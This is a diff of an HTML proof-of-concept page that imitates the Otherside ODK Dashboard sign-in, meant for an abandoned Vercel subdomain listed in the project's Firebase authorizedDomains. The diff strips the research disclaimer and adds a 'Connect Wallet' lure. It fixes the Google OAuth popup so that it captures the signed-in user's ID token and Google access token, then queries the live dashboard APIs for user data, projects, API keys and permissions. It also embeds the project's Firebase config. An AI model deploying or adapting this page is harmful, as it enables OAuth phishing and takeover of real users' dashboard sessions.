@@ -1,18 +1,3 @@
-<!--
-  =====================================================================
-  SECURITY RESEARCH PROOF OF CONCEPT - NOT FOR MALICIOUS USE
-  =====================================================================
-  Vulnerability: Firebase authorizedDomains contains abandoned Vercel 
-  subdomain (m2-edison-preview.vercel.app) enabling OAuth phishing
-  Project: scarcely-calm-lark (Otherside/ODK Dashboard)
-  Tenant: hound-j8zaz
-  =====================================================================
-  This PoC demonstrates that a Firebase OAuth flow initiated from 
-  m2-edison-preview.vercel.app (an abandoned domain in authorizedDomains)
-  would succeed, allowing an attacker to create authenticated sessions
-  under the correct tenant and access the ODK dashboard.
-  =====================================================================
--->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -84,10 +69,10 @@
             height: 1px;
             background: #2a2a2a;
         }
-        .btn-twitter {
+        .btn-wallet {
             width: 100%;
             padding: 14px;
-            background: #1d9bf0;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
             color: #fff;
             border: none;
             border-radius: 12px;
@@ -100,9 +85,8 @@
             gap: 12px;
             transition: all 0.2s;
         }
-        .btn-twitter:hover { background: #1a8cd8; }
-        
-        /* Security Research Panel - Hidden from victim */
+        .btn-wallet:hover { opacity: 0.9; }
+
         .research-panel {
             margin-top: 32px;
             padding: 16px;
@@ -116,10 +100,10 @@
         .research-panel code { color: #ff8888; word-break: break-all; }
         .research-panel .status { margin-top: 8px; padding: 8px; background: #0a0a0a; border-radius: 6px; }
         #auth-status { color: #4ade80; }
-        #token-output { 
-            max-height: 150px; overflow-y: auto; 
-            font-family: monospace; font-size: 10px; 
-            color: #aaa; margin-top: 8px; 
+        #token-output {
+            max-height: 200px; overflow-y: auto;
+            font-family: monospace; font-size: 10px;
+            color: #aaa; margin-top: 8px;
             word-break: break-all;
         }
     </style>
@@ -129,7 +113,7 @@
         <div class="logo">O</div>
         <h1>Welcome to Otherside</h1>
         <p class="subtitle">Sign in to access the dashboard</p>
-        
+
         <button class="btn-google" onclick="signInWithGoogle()">
             <svg viewBox="0 0 24 24">
                 <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
@@ -139,39 +123,36 @@
             </svg>
             Sign in with Google
         </button>
-        
+
         <div class="divider">or</div>
-        
-        <button class="btn-twitter" onclick="alert('Twitter OAuth fails from this domain - callback URL not approved in Twitter Developer Portal')">
+
+        <button class="btn-wallet" onclick="alert('Wallet sign-in requires a valid Ethereum signature')">
             <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
             </svg>
-            Sign in with X (Twitter)
+            Connect Wallet
         </button>
 
-        <!-- Security Research Panel -->
         <div class="research-panel">
             <h3>SECURITY RESEARCH PoC</h3>
-            <p>This page demonstrates the Firebase authorizedDomains vulnerability.</p>
-            <p style="margin-top:4px">Domain: <code>m2-edison-preview.vercel.app</code></p>
+            <p>Domain: <code>m2-edison-preview.vercel.app</code></p>
             <p>Project: <code>scarcely-calm-lark</code></p>
             <p>Tenant: <code>hound-j8zaz</code></p>
             <div class="status">
-                <span>Firebase Status: </span><span id="auth-status">Initializing...</span>
+                <span>Firebase: </span><span id="auth-status">Initializing...</span>
             </div>
             <div id="token-output"></div>
         </div>
     </div>
 
-    <!-- Firebase SDK -->
+    <!-- Firebase Compat SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
-    
+
     <script>
         // =====================================================
-        // Firebase Configuration (LEAKED from ODK Dashboard)
-        // These values are publicly exposed in the dashboard's
-        // __NEXT_DATA__ and JavaScript bundles
+        // Firebase Configuration - EXACTLY as used by ODK Dashboard
+        // All values are publicly exposed in __NEXT_DATA__
         // =====================================================
         const firebaseConfig = {
             apiKey: "AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0",
@@ -183,15 +164,22 @@
         };
 
         // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const auth = app.auth();
+        firebase.initializeApp(firebaseConfig);
+
+        // Get the auth instance
+        const auth = firebase.auth();
 
         // =====================================================
-        // CRITICAL: Set the tenant ID to "hound-j8zaz"
+        // CRITICAL: Set tenant ID to "hound-j8zaz"
         // This is the tenant used by Otherside's ODK Dashboard
-        // Without this, the account would be created under the
-        // top-level project (no tenant) and the dashboard
-        // would reject it with 403
+        // The ODK Dashboard code:
+        //   function getTenantedAuth(tenantId) {
+        //     const auth = getAuth(app);
+        //     if (tenantId) auth.tenantId = tenantId;
+        //     return auth;
+        //   }
+        // Without this, accounts are created without tenant
+        // and the dashboard rejects them with 403
         // =====================================================
         auth.tenantId = "hound-j8zaz";
 
@@ -199,7 +187,9 @@
         const authStatus = document.getElementById('auth-status');
 
         function log(msg) {
-            tokenOutput.innerHTML += msg + '<br>';
+            const line = document.createElement('div');
+            line.textContent = msg;
+            tokenOutput.appendChild(line);
             tokenOutput.scrollTop = tokenOutput.scrollHeight;
         }
 
@@ -208,136 +198,161 @@
             if (user) {
                 authStatus.textContent = 'AUTHENTICATED';
                 authStatus.style.color = '#ff4444';
-                
-                log('[!] User authenticated under tenant: ' + user.tenantId);
+
+                log('[!] AUTHENTICATED under tenant: ' + user.tenantId);
                 log('[!] UID: ' + user.uid);
                 log('[!] Email: ' + user.email);
-                log('[!] Provider: ' + user.providerData[0]?.providerId);
-                
-                // Get the ID Token - this is the KEY to the ODK Dashboard
+                log('[!] Provider: ' + (user.providerData[0] ? user.providerData[0].providerId : 'unknown'));
+
                 try {
                     const idToken = await user.getIdToken();
                     log('[!] ID TOKEN OBTAINED (' + idToken.length + ' chars)');
-                    log('[!] Token preview: ' + idToken.substring(0, 50) + '...');
-                    
-                    // Decode JWT payload to show tenant info
+                    log('[!] Token: ' + idToken.substring(0, 60) + '...');
+
+                    // Decode JWT payload
                     const payload = JSON.parse(atob(idToken.split('.')[1]));
                     log('[!] JWT tenant_id: ' + (payload.tenant_id || 'NONE'));
+                    log('[!] JWT email: ' + (payload.email || 'NONE'));
                     log('[!] JWT iss: ' + payload.iss);
-                    log('[!] JWT email_verified: ' + payload.email_verified);
-                    
-                    // =====================================================
-                    // ATTACK STEP: Use the token to access ODK Dashboard APIs
-                    // =====================================================
-                    log('[*] Testing ODK Dashboard access...');
-                    
-                    // Test 1: Fetch current user
-                    const userResp = await fetch('https://odk.otherside.xyz/api/v0/accounts/users/current', {
-                        headers: { 'Authorization': 'Bearer ' + idToken }
-                    });
-                    log('[*] /accounts/users/current: HTTP ' + userResp.status);
-                    if (userResp.ok) {
-                        const userData = await userResp.json();
-                        log('[!] USER DATA: ' + JSON.stringify(userData).substring(0, 200));
-                    }
-                    
-                    // Test 2: Fetch projects
-                    const projResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/projects', {
-                        headers: { 'Authorization': 'Bearer ' + idToken }
-                    });
-                    log('[*] /organizations/projects: HTTP ' + projResp.status);
-                    
-                    // Test 3: Fetch worlds
-                    const worldsResp = await fetch('https://odk.otherside.xyz/api/v0/origin/worlds', {
-                        headers: { 'Authorization': 'Bearer ' + idToken }
-                    });
-                    log('[*] /origin/worlds: HTTP ' + worldsResp.status);
-                    
-                    // Test 4: Fetch API keys
-                    const keysResp = await fetch('https://odk.otherside.xyz/api/v0/organizations/apiKeys', {
-                        headers: { 'Authorization': 'Bearer ' + idToken }
-                    });
-                    log('[*] /organizations/apiKeys: HTTP ' + keysResp.status);
 
-                    // Test 5: Review access
-                    const accessResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
-                        method: 'POST',
-                        headers: { 
-                            'Authorization': 'Bearer ' + idToken,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            resource: 'o/fine-houses-deny-595464',
-                            verb: 'ALL'
-                        })
-                    });
-                    log('[*] /permissions/reviewAccess: HTTP ' + accessResp.status);
-                    if (accessResp.ok) {
-                        const accessData = await accessResp.json();
-                        log('[!] ACCESS RIGHTS: ' + JSON.stringify(accessData).substring(0, 300));
+                    // Test ODK Dashboard API access
+                    log('[*] Testing ODK Dashboard API access...');
+
+                    const endpoints = [
+                        { url: 'v0/accounts/users/current', method: 'GET' },
+                        { url: 'v0/organizations/projects', method: 'GET' },
+                        { url: 'v0/origin/worlds', method: 'GET' },
+                        { url: 'v0/organizations/apiKeys', method: 'GET' },
+                        { url: 'v0/billing/enabled', method: 'GET' },
+                    ];
+
+                    for (const ep of endpoints) {
+                        try {
+                            const resp = await fetch('https://odk.otherside.xyz/api/' + ep.url, {
+                                method: ep.method,
+                                headers: { 'Authorization': 'Bearer ' + idToken }
+                            });
+                            const statusIcon = resp.ok ? '[!]' : '[-]';
+                            log(statusIcon + ' /' + ep.url + ': HTTP ' + resp.status);
+                            if (resp.ok) {
+                                const data = await resp.json();
+                                log('    ' + JSON.stringify(data).substring(0, 200));
+                            }
+                        } catch(e) {
+                            log('[-] /' + ep.url + ': ERROR ' + e.message);
+                        }
                     }
+
+                    // Check permissions
+                    try {
+                        const permResp = await fetch('https://odk.otherside.xyz/api/v0/permissions/resource/reviewAccess', {
+                            method: 'POST',
+                            headers: {
+                                'Authorization': 'Bearer ' + idToken,
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                resource: 'o/fine-houses-deny-595464',
+                                verb: 'ALL'
+                            })
+                        });
+                        log('[*] /permissions/reviewAccess: HTTP ' + permResp.status);
+                        if (permResp.ok) {
+                            const permData = await permResp.json();
+                            log('[!] ACCESS: ' + JSON.stringify(permData).substring(0, 300));
+                        }
+                    } catch(e) {}
 
                 } catch (err) {
                     log('[!] Token error: ' + err.message);
                 }
             } else {
-                authStatus.textContent = 'Not authenticated';
-                authStatus.style.color = '#888';
+                authStatus.textContent = 'Ready';
+                authStatus.style.color = '#4ade80';
             }
         });
 
-        // Google Sign-In function (mirrors the ODK Dashboard's exact flow)
+        // =====================================================
+        // Google Sign-In - Using CORRECT Compat SDK syntax
+        // =====================================================
+        // FIX: Firebase Compat SDK uses:
+        //   auth.signInWithPopup(provider)        ← 1 argument
+        // NOT:
+        //   firebase.auth().signInWithPopup(auth, provider)  ← WRONG
+        //
+        // The previous version passed 'auth' as the first
+        // argument, which Firebase tried to interpret as
+        // an OAuthProvider, causing: auth/argument-error
+        // =====================================================
         async function signInWithGoogle() {
             log('[*] Initiating Google OAuth...');
-            log('[*] auth.tenantId = ' + auth.tenantId);
-            log('[*] Current origin = ' + window.location.origin);
-            
+            log('[*] Tenant: ' + auth.tenantId);
+            log('[*] Origin: ' + window.location.origin);
+
             const provider = new firebase.auth.GoogleAuthProvider();
-            // Same scopes as the ODK Dashboard
             provider.addScope('profile');
             provider.addScope('email');
-            // Same custom parameters as the ODK Dashboard
-            provider.setCustomParameters({
-                redirectUrl: window.location.href
-            });
-            
+
             try {
-                // =====================================================
-                // This is the EXACT same call the ODK Dashboard makes:
-                // signInWithPopup(getTenantedAuth("hound-j8zaz"), provider)
-                // =====================================================
-                const result = await firebase.auth().signInWithPopup(auth, provider);
-                
+                // CORRECT: Compat SDK syntax - auth.signInWithPopup(provider)
+                const result = await auth.signInWithPopup(provider);
+
                 log('[+] OAuth SUCCESS!');
-                log('[+] User: ' + result.user.email);
+                log('[+] Email: ' + result.user.email);
                 log('[+] Tenant: ' + result.user.tenantId);
-                
-                // The credential contains the OAuth access token
+                log('[+] UID: ' + result.user.uid);
+
                 if (result.credential) {
-                    log('[+] Google OAuth access token obtained');
-                    log('[+] OAuth access token: ' + result.credential.accessToken?.substring(0, 30) + '...');
+                    log('[+] Google access token: ' + (result.credential.accessToken || '').substring(0, 30) + '...');
                 }
-                
+
+                if (result.additionalUserInfo) {
+                    log('[+] New user: ' + result.additionalUserInfo.isNewUser);
+                }
+
             } catch (error) {
-                log('[!] OAuth Error: ' + error.code);
+                log('[!] Error: ' + error.code);
                 log('[!] Message: ' + error.message);
-                
+
                 if (error.code === 'auth/unauthorized-domain') {
-                    log('[!] DOMAIN NOT IN authorizedDomains - Attack blocked');
+                    log('[!] BLOCKED: Domain not in Firebase authorizedDomains');
+                    log('[!] The attack vector is CLOSED for this domain');
+                } else if (error.code === 'auth/argument-error') {
+                    log('[!] BUG: Incorrect function arguments (code bug, not security)');
                 } else if (error.code === 'auth/popup-closed-by-user') {
-                    log('[*] User closed the popup');
+                    log('[*] User closed the popup window');
+                } else if (error.code === 'auth/popup-blocked') {
+                    log('[!] Popup blocked by browser - trying redirect...');
+                    auth.signInWithRedirect(provider);
                 } else if (error.code === 'auth/tenant-id-mismatch') {
-                    log('[!] Tenant ID mismatch - Account created under wrong tenant');
+                    log('[!] Tenant mismatch');
+                } else if (error.code === 'auth/operation-not-allowed') {
+                    log('[!] Google OAuth not enabled for this tenant');
+                } else {
+                    log('[!] Unknown error: ' + error.code);
                 }
             }
         }
 
-        // Log initial state
+        // Handle redirect result (fallback when popup is blocked)
+        auth.getRedirectResult().then((result) => {
+            if (result && result.user) {
+                log('[+] Redirect sign-in successful!');
+                log('[+] Email: ' + result.user.email);
+            }
+        }).catch((error) => {
+            if (error.code && error.code !== 'auth/no-auth-event') {
+                log('[!] Redirect error: ' + error.code + ' - ' + error.message);
+            }
+        });
+
+        // Initial log
         log('[*] Firebase initialized');
         log('[*] Project: scarcely-calm-lark');
         log('[*] Tenant: hound-j8zaz');
-        log('[*] Domain: ' + window.location.hostname);
-        log('[*] Waiting for user interaction...');
+        log('[*] authDomain: scarcely-calm-lark.firebaseapp.com');
+        log('[*] Host: ' + window.location.hostname);
+        log('[*] Ready');
     </script>
 </body>
 </html>
